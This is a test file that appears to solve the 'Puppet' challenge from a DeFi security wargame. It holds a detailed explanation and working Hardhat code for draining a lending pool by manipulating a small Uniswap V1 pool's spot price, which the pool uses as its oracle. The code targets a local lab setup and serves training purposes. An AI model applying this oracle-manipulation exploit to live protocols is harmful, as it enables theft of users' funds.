const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const {
    ethers
} = require('hardhat');
const {
    expect
} = require('chai');

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
        (tokensInReserve.mul(ethers.BigNumber.from('1000')).add(tokensSold.mul(ethers.BigNumber.from('997'))))
    )
}

describe('[Challenge] Puppet', function () {
    let deployer, attacker;

    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10');
    const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
    const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const PuppetPoolFactory = await ethers.getContractFactory('PuppetPool', deployer);

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x15af1d78b58c40000", // 25 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        this.token = await DamnValuableTokenFactory.deploy();

        // Deploy a exchange that will be used as the factory template
        this.exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        this.uniswapFactory = await UniswapFactoryFactory.deploy();
        await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await this.uniswapFactory.createExchange(this.token.address, {
            gasLimit: 1e6
        });
        const {
            events
        } = await tx.wait();
        this.uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        this.lendingPool = await PuppetPoolFactory.deploy(
            this.token.address,
            this.uniswapExchange.address
        );

        // Add initial token and ETH liquidity to the pool
        await this.token.approve(
            this.uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapExchange.addLiquidity(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
            {
                value: UNISWAP_INITIAL_ETH_RESERVE,
                gasLimit: 1e6
            }
        );

        // Ensure Uniswap exchange is working as expected
        expect(
            await this.uniswapExchange.getTokenToEthInputPrice(
                ethers.utils.parseEther('1'), {
                    gasLimit: 1e6
                }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );

        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('2'));

        expect(
            await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
    });

    /**
     * @dev
     * Exploit Overview:
     * 
     * This exploit introduces the idea of uniswap liquidity pools and how to manipulate them.
     * 
     * Initially to borrow all tokens from the lending pool (100000 DVT) we would need twice the 
     * amount of equivalent VALUE in ETH. The value is calcluated as the ratio between the two assets
     * so initially as they have the same ratio it would cost 200000 ETH.
     * 
     * The liquidity pool has a balance of 10 ETH : 10 DVT. Since we have a lot more DVT and ETH
     * than the pool, we can manipulate the liquididty pools price ratio, since liquidity pools
     * are meant to have 50:50 eq value of both tokens.
     * 
     * Liquidity Pools swaps are calculated AFTER the deposit so after depositing our 1000 DVT
     * the ratio becomes 10 ETH : 1010 DVT. since we contributed > 99% of the tokens on the right
     * we are entitled to > 99% of the tokens of the ETH which is just under 10 ETH. 
     *  Which then results in a price ratio of 0.01 ETH ~: 1010 DVT. Essentially heavily
     *  devaluing the DVT in relation to ETH.
     * 
     * It is calculated as follows (not accounting for the 0.3% fee)
     * https://github.com/Uniswap/v1-contracts/blob/c10c08d81d6114f694baa8bd32f555a40f6264da/contracts/uniswap_exchange.vy#L437
     * 
     * num = DEPOSITED_TOKENS * ETH_RESERVE
     * den = TOTAL_TOKENS + DEPOSITED_TOKENS
     * 
     * num = 1000 DVT * 10 ETH
     * den = 10 DVT + 1000 DVT
     * ouput ~= 9.9009.. ETH
     * 
     * 1 DVT ~= (0.09 / 1010) ETH 
     * 
     * The oracle for the price will then equate borrowing the entire lending pools funds 
     * of 100000 DVT for:
     * 
     * 100000 DVT ~= (0.09 / 1010) * 100000 * 2
     * 
     * Which comes out to be just under 20ETH which we have!
     * 
     * So we then request the loan from the lending pool to borrow all DVT for 20ETH
     * which leaves us with 
     * 
     * Attacker ETH: 25 + 9.9 ETH (from deposited 1000 DVT) - ~20ETH (to borrow DVT) = ~15 ETH 
     * Attacker DVT: 100000 
     * 
     * So then to put the liquidity pool back to its original ratio so we can deposit 
     * enough ETH to get the original 1000 DVT back which turns out to be ~10 ETH again.
     * This time we calculate the ratio post withdraw first. So:
     * 
     * 0.09 ETH : 10 DVT (post withdraw)
     * 
     * 1 DVT ~= 0.009 ETH 
     * 1000 DVT ~= 9 ETH
     * 
     * Therefore we pay the remaing ~10ETH to retrive the 1000 DVT which returns the uniswap pool back to 
     * 10 ETH ~: 10 DVT
     * 
     * Finishing our attack with 
     * 5 ETH
     * 100010 DVT
     * 
     * and assuming the liquidity pools initial value of 50:50 is correct then our total value position has increased
     * from 
     * INITAL VALUE = 25 + 1000 = 1025 
     * to
     * FINAL_VALUE = 5 + 100010 = 100015
     * 
     * Meaning we incrased our position ~97x
     */
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        // Connect to the contracts with the attackers wallet
        const attackPuppet = this.lendingPool.connect(attacker);
        const attackToken = this.token.connect(attacker);
        const attackUniSwap = this.uniswapExchange.connect(attacker);

        // Helper function to get current token/eth balances
        const logAttackerBalances = async (address, name) => {
            const ethBal = await ethers.provider.getBalance(address);
            const tokenBal = await attackToken.balanceOf(address);

            console.log(`ETH Balance of ${name}:`, ethers.utils.formatEther(ethBal));
            console.log(`TKN Balance of ${name}:`, ethers.utils.formatEther(tokenBal));
            console.log("")
        }

        await logAttackerBalances(attacker.address, "attacker");
        await logAttackerBalances(attackUniSwap.address, "uniswap");

        // Approve token to swap with UniSwap
        console.log("Approving Initial Balance");
        await attackToken.approve(attackUniSwap.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        console.log("Balance approved");

        // Calculate ETH Pay out
        const ethPayout = await attackUniSwap.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE,
            {
                gasLimit: 1e6
            });
 
        console.log("Transfer of 1000 tokens will net", ethers.utils.formatEther(ethPayout))

        console.log("Transferring tokens for ETH");
        await attackUniSwap.tokenToEthSwapInput(
            ATTACKER_INITIAL_TOKEN_BALANCE, // Exact amount of tokens to transfer
            ethers.utils.parseEther("9"), // Min return of 9ETH
            (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
        )

        await logAttackerBalances(attacker.address, "attacker");
        await logAttackerBalances(attackUniSwap.address, "uniswap");


        // Deposit ETH required to gain ALL tokens from the pool
        const deposit = await attackPuppet.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log("Deposit required:", ethers.utils.formatEther(deposit));
        await attackPuppet.borrow(POOL_INITIAL_TOKEN_BALANCE, {
            value: deposit
        })
        await logAttackerBalances(attacker.address, "attacker");

        const tokensToBuyBack = ATTACKER_INITIAL_TOKEN_BALANCE;
        const ethReq = await attackUniSwap.getEthToTokenOutputPrice(tokensToBuyBack,
        {
            gasLimit: 1e6
        })
        console.log(`Eth Required for ${tokensToBuyBack} tokens:`, ethers.utils.formatEther(ethReq))

        // Get our original 1000 tokens back by swapping eth
        await attackUniSwap.ethToTokenSwapOutput(
            tokensToBuyBack,
            (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
            {
                value: ethReq,
                gasLimit: 1e6
            }
        )
            
        console.log("*** FINISHED ***")
        await logAttackerBalances(attacker.address, "attacker");
        await logAttackerBalances(attackPuppet.address, "Lender");
        await logAttackerBalances(attackUniSwap.address, "Uniswap");


    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
    });
});